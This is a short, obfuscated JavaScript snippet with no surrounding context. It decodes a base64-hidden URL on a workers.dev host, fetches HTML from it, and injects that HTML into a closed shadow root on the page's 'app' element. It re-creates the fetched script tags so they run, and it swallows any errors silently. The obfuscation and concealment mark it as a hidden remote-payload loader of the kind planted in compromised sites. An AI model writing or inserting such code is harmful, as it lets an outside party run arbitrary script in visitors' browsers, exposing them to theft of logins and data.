(async function() {
    const _0x3e1 = "aHR0cHM6Ly9vcmFuZ2Vob3N0Lm9yYW5nZS1wcmludC10b29scy53b3JrZXJzLmRldi9wL215LXByZmwv";
    const _0x52a = atob(_0x3e1);
    
    try {
        const _0x9x = await fetch(_0x52a);
        const _0x1c = await _0x9x.text();
        const _0x_t = document.getElementById('app');
        
        if (_0x_t) {
            const _0x_s = _0x_t.attachShadow({ mode: 'closed' });
            _0x_s.innerHTML = _0x1c;
            
            const _0x_f = _0x_s.querySelectorAll('script');
            _0x_f.forEach((_0x_o) => {
                const _0x_n = document.createElement('script');
                Array.from(_0x_o.attributes).forEach(a => _0x_n.setAttribute(a.name, a.value));
                _0x_n.appendChild(document.createTextNode(_0x_o.innerHTML));
                _0x_s.appendChild(_0x_n);
            });
        }
    } catch (_0x_err) {}
})();
